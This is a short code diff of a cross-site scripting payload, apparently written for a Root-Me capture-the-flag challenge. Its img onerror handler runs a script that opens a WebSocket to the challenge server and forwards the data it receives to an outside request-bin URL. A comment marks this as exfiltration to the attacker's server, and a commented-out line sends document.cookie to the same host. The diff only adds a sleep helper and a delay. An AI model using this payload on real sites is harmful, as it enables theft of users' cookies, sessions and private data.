@@ -4,6 +4,9 @@
 <img src=x onerror="gogo()">
 <!--<img src=x onerror="window.location.href='https://en6gc9c8vfzvo.x.pipedream.net?imageError' + document.cookie"> -->
 <script>
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
 function gogo() {
 	var ws = new WebSocket("ws://ctf17.root-me.org/ws");
 	ws.onopen = start
@@ -15,6 +18,7 @@ function gogo() {
 	  //Exfiltrate the confidential information to attackers server
 	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
 	}
+	sleep(1000)
 	ws.send(`hello`);
 }
 
